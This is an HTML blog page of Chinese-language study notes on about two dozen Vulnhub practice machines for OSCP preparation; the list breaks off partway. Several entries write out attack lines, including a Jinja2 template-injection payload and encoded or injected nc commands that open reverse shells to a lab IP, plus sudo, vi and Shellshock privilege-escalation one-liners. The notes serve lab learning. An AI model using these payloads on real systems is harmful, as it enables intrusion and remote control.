@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="Fazx">
+
+
+
+<meta name="description" content="‮">
+<meta name="keywords" content="OSCP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="50台Vulnhub靶机Walkthrough">
+<meta property="og:url" content="0sec.com.cn/2023-04-30/index.html">
+<meta property="og:site_name" content="Cosmic Fragments">
+<meta property="og:description" content="‮">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="/img/20230721220114.png">
+<meta property="og:updated_time" content="2024-05-29T06:46:30.377Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="50台Vulnhub靶机Walkthrough">
+<meta name="twitter:description" content="‮">
+<meta name="twitter:image" content="/img/20230721220114.png">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Cosmic Fragments" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>50台Vulnhub靶机Walkthrough | Cosmic Fragments</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?16b144395cc20d4a7b4ab64227601921";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Fazx</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">OSCP, OSWP, Security+, @Orange Cyberdefense</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa 豆瓣" href="https://www.douban.com/people/faithandchange/" title="豆瓣"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/ping2u" title="知乎"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/Fazx" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">一个喜欢读和写的伪理科生。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Fazx</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Fazx</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">OSCP, OSWP, Security+, @Orange Cyberdefense</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa 豆瓣" target="_blank" href="https://www.douban.com/people/faithandchange/" title="豆瓣"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/ping2u" title="知乎"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Fazx" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-50台Vulnhub靶机Walkthrough" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023-04-30/" class="article-date">
+      <time datetime="2023-04-30T13:03:55.000Z" itemprop="datePublished">2023-04-30</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      50台Vulnhub靶机Walkthrough
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/OSCP/">OSCP</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>‮<br><a id="more"></a><br>我这里主要记录了一个大概的思路、关键词，方便遇到类似内容的时候检索。<br><br>Vulnhub的内容和OSCP考察点当然不是完全一样的，所以有些脑洞的杂项我就一带而过了，不浪费时间。</p>
+<p><a href="[https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">TJnull list</a> <br><br>个别靶机获取不到IP：<br><a href="https://blog.csdn.net/qq_57976347/article/details/122772242" target="_blank" rel="noopener">vulnhub靶机获取不到ip_vulnhub靶机扫描不到ip_汉南帝的博客-CSDN博客</a><br><a name="sar2html"></a></p>
+<h3 id="sar2html"><a href="#sar2html" class="headerlink" title="sar2html"></a>sar2html</h3><ul>
+<li>命令注入漏洞</li>
+<li>计划任务提权</li>
+</ul>
+<p><a href="https://blog.csdn.net/qq_43264813/article/details/113248579" target="_blank" rel="noopener">https://blog.csdn.net/qq_43264813/article/details/113248579</a><br><a name="LiterallyVulnerable"></a></p>
+<h3 id="LiterallyVulnerable"><a href="#LiterallyVulnerable" class="headerlink" title="LiterallyVulnerable"></a>LiterallyVulnerable</h3><ul>
+<li>FTP匿名登录anonymous</li>
+<li>网站样式错误改hosts</li>
+<li>wpscan自定义密码爆破</li>
+<li>Wordpress后台getshell</li>
+<li>SUID提权，控制环境变量</li>
+<li>sudo -l提权</li>
+</ul>
+<p><a href="https://mr-potatoz.github.io/2020/03/20/LiterallyVulnerable/" target="_blank" rel="noopener">https://mr-potatoz.github.io/2020/03/20/LiterallyVulnerable/</a><br><br><a href="https://lifesfun101.github.io/2019/12/10/LiteraryVulnerable-walkthrough.html#wpscan" target="_blank" rel="noopener">https://lifesfun101.github.io/2019/12/10/LiteraryVulnerable-walkthrough.html#wpscan</a></p>
+<p><a name="Misdirection"></a></p>
+<h3 id="Misdirection"><a href="#Misdirection" class="headerlink" title="Misdirection"></a>Misdirection</h3><ul>
+<li>8080端口web预留后门</li>
+<li>sudo -l</li>
+<li>sudo -u user /bin/bash（需要弹出shell后）</li>
+<li>/etc/passwd可写，openssl passwd evil，su过去</li>
+</ul>
+<p><a href="https://download.vulnhub.com/media/misdirection/Misdirection-Walkthrough.pdf" target="_blank" rel="noopener">https://download.vulnhub.com/media/misdirection/Misdirection-Walkthrough.pdf</a></p>
+<p><a name="prime1"></a></p>
+<h3 id="prime1"><a href="#prime1" class="headerlink" title="prime1"></a>prime1</h3><ul>
+<li>扫目录找到secret.txt,image.php</li>
+<li>通过返回内容长度FUZZ，?file=读文件，读/etc/passwd有提示</li>
+<li>ssh无法直接登录用户</li>
+<li><code>wpscan --enumerate u</code>找到wordpress后台用户，登录</li>
+<li>后台插件不可写，主题里有一个隐蔽的可写文件，getshell</li>
+<li>sudo -l的文件需要root不知道密码</li>
+<li>低版本系统通用漏洞提权 <code>uname -a</code> <code>Linux ubuntu 4.10.0-28-generic</code></li>
+</ul>
+<p><a href="https://blog.csdn.net/weixin_46128614/article/details/104039451" target="_blank" rel="noopener">https://blog.csdn.net/weixin_46128614/article/details/104039451</a></p>
+<p><a name="election"></a></p>
+<h3 id="election"><a href="#election" class="headerlink" title="election"></a>election</h3><ul>
+<li>root/toor进phpmyadmin</li>
+<li>翻找到后台口令，登录找到log，SSH连接</li>
+<li>（也可以直接扫到log用口令连接）</li>
+<li>suid找到Serv-U程序，切进目录找到版本</li>
+<li>searchexploit，从exploit-db看使用教程</li>
+</ul>
+<p><a href="https://zhuanlan.zhihu.com/p/375148532" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/375148532</a></p>
+<p><a name="e16fe194"></a></p>
+<h3 id="Glasgow-Smile-2"><a href="#Glasgow-Smile-2" class="headerlink" title="Glasgow Smile 2"></a>Glasgow Smile 2</h3><ul>
+<li>提示<code>.sh</code>，<code>wfuzz FUZZ.sh</code>或<code>gobuster -x sh</code>找到<code>joke.sh</code></li>
+<li>web页面drupal 8 searchsploit 44448.py getshell</li>
+<li>内网看ss -tan有没扫到的8080端口，socat端口转发再访问</li>
+<li><code>socat TCP4-LISTEN:18080,fork TCP4:127.0.0.1:8080 &amp;</code></li>
+<li>源码提示nginx apache2，源码中找到LFI</li>
+<li>读nginx配置文件找到路由，不在/html下所以继续包含index.php</li>
+<li>猜了个很扯的谜，然后给了密码ssh登录，后面逆向的不做了</li>
+</ul>
+<p><a href="https://ksdpmx.bitbucket.io/2020/08/11/glasgow-smile-2-513/" target="_blank" rel="noopener">https://ksdpmx.bitbucket.io/2020/08/11/glasgow-smile-2-513/</a><br><a href="https://h0j3n.medium.com/vulnhub-glasgow-smile-2-1419ebe66a3b" target="_blank" rel="noopener">https://h0j3n.medium.com/vulnhub-glasgow-smile-2-1419ebe66a3b</a><br><a name="healthcare"></a></p>
+<h3 id="healthcare"><a href="#healthcare" class="headerlink" title="healthcare"></a>healthcare</h3><ul>
+<li>开放21和80端口</li>
+<li>大字典扫目录找到/openemr，searchexploit该版本有注入</li>
+<li>搜个时间盲注脚本，注到用户密码</li>
+<li>登进去无法RCE，回过来登FTP</li>
+<li>是一个全局FTP，可以给web目录下put webshell</li>
+<li>（从reverse shell里可以再su到注出的用户，等于web FTP ssh密码全一样）</li>
+<li>SUID找到名字奇怪的文件，strings发现调用fdisk</li>
+<li>添加环境变量，控制环境变量下的fdisk为<code>/bin/bash</code></li>
+</ul>
+<p><a href="https://hitesh1210.github.io/posts/Healthcare-Writeup/" target="_blank" rel="noopener">https://hitesh1210.github.io/posts/Healthcare-Writeup/</a></p>
+<p><a name="pYyPM"></a></p>
+<h3 id="secarmy-village"><a href="#secarmy-village" class="headerlink" title="secarmy_village"></a>secarmy_village</h3><ul>
+<li>多个用户对应多个关卡</li>
+<li><code>upx -d</code>脱壳，strings找到关键信息</li>
+<li>telnet连接1337端口，输入口令返回token</li>
+<li>脚本解码多个qrcode</li>
+<li>john -w=rockyou.txt解密用户hash</li>
+<li>web结合ssh目录，命令执行</li>
+<li>xordecode解密编码</li>
+<li>pcapng文件直接strings找密码</li>
+<li>pwnme程序，BoF覆盖变量提权</li>
+</ul>
+<p><a href="https://marmeus.com/post/Secarmy20#flag-6" target="_blank" rel="noopener">https://marmeus.com/post/Secarmy20#flag-6</a></p>
+<p><a name="jOmwp"></a></p>
+<h3 id="DevGuru1"><a href="#DevGuru1" class="headerlink" title="DevGuru1"></a>DevGuru1</h3><ul>
+<li>git泄露database.php找到Adminer密码</li>
+<li>Bcrypt加密无法解密，但是生成后替换密文</li>
+<li>October CMS后台getshell</li>
+<li>/var/backups/app.ini.bak找到另一个库的密码，登Adminer</li>
+<li>修改第二个站(Gitea)的用户加密方式和密文，登录</li>
+<li>searchexploit认证后getshell，需要去除URL后的/再打exp</li>
+<li>sudo -l找到sqlite3，但是不能直接以root运行</li>
+<li>结合sudo version &lt; v1.28漏洞提权</li>
+<li><code>sudo -u#-1 /usr/bin/sqlite3 /dev/null &#39;.shell /bin/sh&#39;</code></li>
+</ul>
+<p><a href="https://blog.yarsalabs.com/vulnhub-devguru1-walkthrough/" target="_blank" rel="noopener">https://blog.yarsalabs.com/vulnhub-devguru1-walkthrough/</a></p>
+<p><a name="hNhFJ"></a></p>
+<h3 id="Tiki"><a href="#Tiki" class="headerlink" title="Tiki"></a>Tiki</h3><ul>
+<li>(TIki CMS前台Getshell)</li>
+<li>smb共享文件里发现提示口令</li>
+<li>登录后在CMS中找到CVE提示</li>
+<li>通过CVE登录admin发现用户SSH凭据</li>
+<li>sudo -l发现该用户可以执行所有命令，直接sudo su</li>
+</ul>
+<p><a href="https://yufongg.github.io/posts/Tiki-1/#initial-foothold" target="_blank" rel="noopener">https://yufongg.github.io/posts/Tiki-1/#initial-foothold</a></p>
+<p><a name="tWuSM"></a></p>
+<h3 id="webdeveloper"><a href="#webdeveloper" class="headerlink" title="webdeveloper"></a>webdeveloper</h3><ul>
+<li>/ipdata目录下发现.cap流量包</li>
+<li>从POST /wp-login.php找到口令，登录WP后台getshell</li>
+<li>LinPEAS找到数据库密码，复用为用户SSH密码</li>
+<li>sudo -l发现tcpdump，在lo网卡产生流量，利用提权执行命令</li>
+<li>（lxd group privilege escalation）（需要在lxd组）<a href="https://reboare.github.io/lxd/lxd-escape.html" target="_blank" rel="noopener">https://reboare.github.io/lxd/lxd-escape.html</a></li>
+</ul>
+<p><a href="https://windsorwebdeveloper.com/web-developer-1-vulnhub-walkthrough/" target="_blank" rel="noopener">https://windsorwebdeveloper.com/web-developer-1-vulnhub-walkthrough/</a></p>
+<p><a name="NcYfC"></a></p>
+<h3 id="solidstate"><a href="#solidstate" class="headerlink" title="solidstate"></a>solidstate</h3><ul>
+<li>4555端口james admin，从网上exp中找到默认密码root/root</li>
+<li>有个exp能直接打，但是需要1click：用户登录，无法利用</li>
+<li>在4555端口列用户，重置用户们的密码</li>
+<li>telnet 110端口登账户翻邮件找到mindy用户SSH密码，nc可能不行</li>
+<li>USER john / PASS pass / LIST / RETR 1</li>
+<li>登录SSH发现是个啥也不能用的restricted shell</li>
+<li><code>ssh mindy@10.10.10.51 bash</code>绕过restricted shell</li>
+<li><code>ssh mindy@192.168.101.42 &quot;export TERM=xterm; python -c &#39;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&#39;&quot;</code></li>
+<li><code>find / -user root -perm -002 -type f -not -path &quot;/proc/*&quot;  2&gt;/dev/null</code>找到一个可写文件</li>
+<li>猜测是在/var/spool/cron/crontabs/root中定时执行，没权限看不到</li>
+<li>脚本内容是清空/tmp目录，测一下发现确实定时在跑</li>
+<li>脚本可写，所以更改os.system()内容就行，可以echo &gt; 覆盖</li>
+<li>也可以把这restricteds shell升级到完全交互式shell，凑合能用</li>
+<li><code>system.os(&#39;cat /root/root.txt &gt; /tmp/flag&#39;)</code></li>
+</ul>
+<p><a href="https://dominicbreuker.com/post/htb_solidstate/" target="_blank" rel="noopener">https://dominicbreuker.com/post/htb_solidstate/</a><br><a href="https://blog.csdn.net/elephantxiang/article/details/122528066" target="_blank" rel="noopener">https://blog.csdn.net/elephantxiang/article/details/122528066</a></p>
+<p><a name="HeSQv"></a></p>
+<h3 id="Tr0ll02"><a href="#Tr0ll02" class="headerlink" title="Tr0ll02"></a>Tr0ll02</h3><ul>
+<li>robots.txt找到多个类似目录，只有页面图片大小不同</li>
+<li>下载异常图片，strings找到提示</li>
+<li>base64批量解码<code>cat answer.txt | base64 -d &gt; decode.txt</code></li>
+<li>文本去重<code>uniq -u decode.txt &gt; unique.txt</code></li>
+<li>Tr0ll/Tr0ll登录ftp</li>
+<li>fcrackzip -u -D -p unique.txt lmao.zip爆破zip密码</li>
+<li>ssh -i privatekey noob@ip私钥登录</li>
+<li>ssh会马上断开，看-v调试信息其实连上了</li>
+<li>ShellShock over SSH   <code>ssh testuser@localhost &#39;() { :;}; echo MALICIOUS CODE&#39;</code></li>
+<li>低版本内核但是没直接提权成功</li>
+<li>setuid 0找到二进制文件，有一个带input参数的可以Segement fault</li>
+<li>BoF inside of env and un-setting the environment variables </li>
+</ul>
+<p><a href="https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-tr0ll-2/" target="_blank" rel="noopener">https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-tr0ll-2/</a><br><a href="https://www.doyler.net/security-not-included/tr0ll-2-walkthrough-you-gotta-pay-the-troll-toll" target="_blank" rel="noopener">https://www.doyler.net/security-not-included/tr0ll-2-walkthrough-you-gotta-pay-the-troll-toll</a></p>
+<p><a name="tOHlY"></a></p>
+<h3 id="Escalate-Linux"><a href="#Escalate-Linux" class="headerlink" title="Escalate_Linux"></a>Escalate_Linux</h3><ul>
+<li>预留后门弹shell</li>
+<li>user3: SUID提权</li>
+<li>覆盖环境变量提权（读/etc/shadow后john或<code>echo &#39;echo &quot;user1:12345&quot; | chpasswd&#39; &gt; ls</code>，修改密码）</li>
+<li>user1: sudo -l 发现(ALL : ALL) ALL，直接切</li>
+<li>user8: sudo -l 发现<code>(root) NOPASSWD: /usr/bin/vi，sudo vi -c &#39;:!/bin/sh&#39; /dev/null</code></li>
+<li>user7: gid=0(root)，可写<code>-rw-rw-r-- 1 root root 2648 Jun  5  2019 /etc/passwd</code></li>
+<li>mysql: root/root翻找到mysql用户密码，找到/etc/mysql下密码文件</li>
+<li>cat /etc/group  root:x:0:user4,user7可以修改passwd</li>
+<li>user5: NFS提权</li>
+</ul>
+<p><a href="https://blog.csdn.net/qq_34801745/article/details/104144580" target="_blank" rel="noopener">https://blog.csdn.net/qq_34801745/article/details/104144580</a></p>
+<p><a name="gL27B"></a></p>
+<h3 id="Pinky’s-palace-02"><a href="#Pinky’s-palace-02" class="headerlink" title="Pinky’s palace 02"></a>Pinky’s palace 02</h3><ul>
+<li>hint给了三个端口，排列组合knock后扫到隐藏端口</li>
+<li>定制用户名字典爆破post form，下载到id_rsa私钥</li>
+<li>ssh密钥登录需要密码，先用ssh2john从文件中提取hash</li>
+<li><code>ssh2john id_rsa &gt; hash.txt</code></li>
+<li><code>john hash --wordlist=/usr/share/wordlists/passwords/rockyou.txt</code></li>
+<li>用户名要改成小写，然后enter passphrase</li>
+<li><code>-rwsr----x 1 pinky   www-data 13384 Mar 16  2018 qsub</code></li>
+<li>当前用户不可读，所以还是要打到web权限</li>
+<li>想的找密码登wp后台getshell，其实直接找web可写文件就行</li>
+<li>获得www-data权限，拖走qsub逆向看密码和命令执行</li>
+<li><code>./qsub &quot;;/bin/bash #&quot;</code>命令拼接注入，获取到pinky权限</li>
+<li><code>./qsub &#39;$(nc -e /bin/bash 192.168.16.143 6666)&#39;</code></li>
+<li>但是还不在pinky组，需要把kali的公钥写到靶机的pinky里</li>
+<li><code>echo [SSH_PUBLIC_KEY] &gt; /home/pinky/.ssh/authorized_keys</code></li>
+<li>（或者直接newgrp）</li>
+<li><code>-rwxrwx--- 1 demon pinky 113 Mar 17  2018 /usr/local/bin/backup.sh</code></li>
+<li>所有者是demon，猜测有一个demon的定时任务在跑，写sh弹shell</li>
+<li>找到所有者是demon但ps aux中root在跑的panel文件</li>
+<li>这服务开在31337端口，BoF提权</li>
+</ul>
+<p><a href="https://www.c0dedead.io/pinkys-palace-v2-walkthrough/" target="_blank" rel="noopener">https://www.c0dedead.io/pinkys-palace-v2-walkthrough/</a><br><a href="https://blog.csdn.net/qq_34801745/article/details/104070421" target="_blank" rel="noopener">https://blog.csdn.net/qq_34801745/article/details/104070421</a></p>
+<p><a name="cxDN9"></a></p>
+<h3 id="zico2"><a href="#zico2" class="headerlink" title="zico2"></a>zico2</h3><ul>
+<li>phpLiteAdmin弱口令admin登录，searchsploit找到利用方法</li>
+<li>但是shell传到的不是web目录</li>
+<li>从主页一个元素找到view.php?page=，路径穿越读shell</li>
+<li>执行命令不好用，用php一句话反弹shell的马</li>
+<li>文件里找到zico密码，su过去，sudo -l看到能用tar，提权</li>
+</ul>
+<p><a href="https://steflan-security.com/vulnhub-zico-2-walkthrough/" target="_blank" rel="noopener">https://steflan-security.com/vulnhub-zico-2-walkthrough/</a></p>
+<p><a name="rO2dK"></a></p>
+<h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><ul>
+<li>最基本的UNION SELECT注入</li>
+<li>（除了这里是个模糊查询，需要%闭合，这个WP里都没提到）</li>
+<li>登录superadmin上传webshell</li>
+<li>找到密码<code>mysql -e &#39;\! /bin/sh&#39; -u root -p</code>还是web权限</li>
+<li>suid文件直接提权</li>
+</ul>
+<p><a href="https://blog.csdn.net/elephantxiang/article/details/122888309" target="_blank" rel="noopener">https://blog.csdn.net/elephantxiang/article/details/122888309</a><br><a href="https://blog.csdn.net/weixin_45527786/article/details/105714687" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45527786/article/details/105714687</a></p>
+<p><a name="DRdwy"></a></p>
+<h3 id="LoadOfTheRoot"><a href="#LoadOfTheRoot" class="headerlink" title="LoadOfTheRoot"></a>LoadOfTheRoot</h3><ul>
+<li>之扫到了22端口，但是尝试连接会提示knock 1,2,3</li>
+<li>knock -v 192.168.146.51 1 2 3</li>
+<li>很慢的时间盲注，还是用了sqlmap</li>
+<li>凭据登web啥也没有，连ssh，SUID文件开启了ASLR很难BoF提权</li>
+<li>root运行的mysql可以load raptor_udf2提权，凭据从login.php里找<strong>(这个linpeas没发现)</strong></li>
+<li>Ubuntu 14.04 3.19.0  39166提权</li>
+</ul>
+<p><a href="https://yufongg.github.io/posts/Lord-of-the-Root-1.0.1/" target="_blank" rel="noopener">https://yufongg.github.io/posts/Lord-of-the-Root-1.0.1/</a><br><a name="oQw87"></a></p>
+<h3 id="decoy"><a href="#decoy" class="headerlink" title="decoy"></a>decoy</h3><ul>
+<li><strong>爆zip密码直接rockyou</strong></li>
+<li>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt save.zip -v</li>
+<li>覆盖环境变量提权失败，strings可以看到调用的绝对路径</li>
+<li>这些可执行文件看了看也都没有写权限</li>
+<li>看第二个参数能不能利用，service的apache2也没有写权限，好像没法覆盖这个服务</li>
+<li>vi实际调用的vim，但是-c参数没法拼接</li>
+<li>结果这些都不能利用，是root定时运行着一个chkrootkit的提权</li>
+</ul>
+<p>假WP：没有log路径<a href="https://resources.infosecinstitute.com/topic/sunset-decoy-vulnhub-ctf-walkthrough/" target="_blank" rel="noopener">https://resources.infosecinstitute.com/topic/sunset-decoy-vulnhub-ctf-walkthrough/</a><br><br><a href="https://www.doyler.net/security-not-included/vulnhub-sunset-decoy-walkthrough" target="_blank" rel="noopener">https://www.doyler.net/security-not-included/vulnhub-sunset-decoy-walkthrough</a><br><a name="zrYuu"></a></p>
+<h3 id="djinn3"><a href="#djinn3" class="headerlink" title="djinn3"></a>djinn3</h3><pre><code>- _{{7*'7'}}_显示7777777，所以是Jinja2而非Twig
+- {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.146.55 8888 >/tmp/f').read() }}
+</code></pre><p>这里我的hexo博客 双大括号标签与 nunjucks 模板引擎的标签发生了冲突，只能整个放代码块里了：<a href="http://www.jouypub.com/2019/184012d6f6847138055a342ff942b743/" target="_blank" rel="noopener">http://www.jouypub.com/2019/184012d6f6847138055a342ff942b743/</a></p>
+<ul>
+<li>pspy发现sanit运行的py，反编译pyc构造ssh私钥免登录</li>
+<li>sudo -l有adduser，sudo adduser test -gid=0加一个root组的用户</li>
+<li>root组对/etc/sudoers可读，发现一个不存在的用户可以执行apt-get，添加这个用户然后提权</li>
+</ul>
+<p><a href="https://www.aldeid.com/wiki/VulnHub-Djinn-3" target="_blank" rel="noopener">https://www.aldeid.com/wiki/VulnHub-Djinn-3</a><br><a href="https://blog.csdn.net/weixin_43784056/article/details/107068610" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43784056/article/details/107068610</a></p>
+<p><a name="RcrMi"></a></p>
+<h3 id="djinn1"><a href="#djinn1" class="headerlink" title="djinn1"></a>djinn1</h3><ul>
+<li>1337端口有1000道算术题，兔子洞</li>
+<li>7331端口用big.txt扫到命令执行，有过滤</li>
+<li><code>echo+YnVzeWJveCBuYyAxOTIuMTY4LjE0Ni41NSA4ODg4IC1lIC9iaW4vYmFzaA==+|+base64+-d|sh</code></li>
+<li>在web的py源码里找到nitish凭据，切过去sudo -l</li>
+<li>(sam) NOPASSWD: /usr/bin/genie ，同时是个<strong>SUID文件</strong></li>
+<li>genie -h给的选项里都没法利用，需要man genie看到个-cmd</li>
+<li>sudo -u sam /usr/bin/genie -cmd id  直接进了sam的shell，没想明白</li>
+<li>在(lxd)组，但是lxd提权到第二步就提示config.yml没权限</li>
+<li>(root) NOPASSWD: /root/lago 可执行不可读</li>
+<li>.pyc反编译找到源码逻辑 <strong>（思路：python的题目环境下多关注pyc文件）</strong>提权</li>
+</ul>
+<p><a href="https://www.cnblogs.com/sn1per/p/11984455.html" target="_blank" rel="noopener">https://www.cnblogs.com/sn1per/p/11984455.html</a><br><a name="T2EBH"></a></p>
+<h3 id="nullbyte"><a href="#nullbyte" class="headerlink" title="nullbyte"></a>nullbyte</h3><ul>
+<li>phpmyadmin是兔子洞，没口令，页面gif里信息是web目录</li>
+<li>爆破key，注入到user口令，phpmyadmin登不上，连SSH</li>
+<li>web目录下的SUID文件，linepeas扫不到</li>
+<li>echo “/bin/bash -p” &gt; ps 覆盖环境变量提权</li>
+</ul>
+<p><a href="https://markclayton.github.io/nullbyte-vulnhub-walkthrough.html" target="_blank" rel="noopener">https://markclayton.github.io/nullbyte-vulnhub-walkthrough.html</a></p>
+<p><a name="aj5cj"></a></p>
+<h3 id="Glasgow-Smile"><a href="#Glasgow-Smile" class="headerlink" title="Glasgow Smile"></a>Glasgow Smile</h3><ul>
+<li>joomla scan扫到版本没有exp利用成功</li>
+<li>joomla后台口令joomla/Gotham，用户名忘了试joomla</li>
+<li>joomla后台extention getshell</li>
+<li>web文件有密码，mysql试了root和mysql又没试joomla，查到rob密码</li>
+<li>ssh登rob看到加密留言，rot13不对，rot1解码（凯撒）切abner用户</li>
+<li>abner用户的bash_history提到一个压缩包，find找到，解压密码没爆出来，是ssh密码</li>
+<li>切到penguin，pspy发现root执行一个文件，改文件内容提权</li>
+</ul>
+<p><a href="https://www.infosecarticles.com/glasgow-smile-1-vulnhub-walkthrough/" target="_blank" rel="noopener">https://www.infosecarticles.com/glasgow-smile-1-vulnhub-walkthrough/</a><br><a href="https://www.kielvaughn.com/ctfs/2020-06-25-glasgow-smile-walkthrough/" target="_blank" rel="noopener">https://www.kielvaughn.com/ctfs/2020-06-25-glasgow-smile-walkthrough/</a></p>
+<p><a name="JONu3"></a></p>
+<h3 id="w34kn3ss"><a href="#w34kn3ss" class="headerlink" title="w34kn3ss"></a>w34kn3ss</h3><ul>
+<li>nmap -A扫描可以看到SSLcert的commonName=weakness.jth，加进hosts</li>
+<li><strong>（碰到HTTPS的站要敏锐）</strong></li>
+<li>再访问提示用户名，目录下有key.pub和提示openssl 0.9.8c-1生成</li>
+<li>searchsploit能根据公钥找到公开的配对私钥，登录SSH</li>
+<li>目录下python可执行文件，这次没有pyc，直接拖回来uncompyle6反编译，找到n30密码</li>
+<li>在sudo组，sudo -l ALL，有密码直接切</li>
+</ul>
+<p><a href="https://yufongg.github.io/posts/W34KN3SS/" target="_blank" rel="noopener">https://yufongg.github.io/posts/W34KN3SS/</a></p>
+<p><a name="vil8A"></a></p>
+<h3 id="Pyexp"><a href="#Pyexp" class="headerlink" title="Pyexp"></a>Pyexp</h3><ul>
+<li>python exec() 命令执行</li>
